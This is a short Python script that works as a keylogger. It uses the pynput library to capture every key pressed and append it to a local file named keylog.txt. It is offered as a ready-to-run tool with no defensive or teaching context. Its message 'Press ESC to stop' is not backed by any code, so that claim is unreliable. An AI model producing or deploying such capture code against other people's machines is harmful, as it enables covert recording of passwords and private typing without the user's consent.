from pynput import keyboard

# Log file where keys will be saved
log_file = "keylog.txt"

def write_to_log(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # For special keys like space, enter, etc.
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_press(key):
    write_to_log(key)

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    print("🔐 Keylogger is running... Press ESC to stop.")
    listener.join()
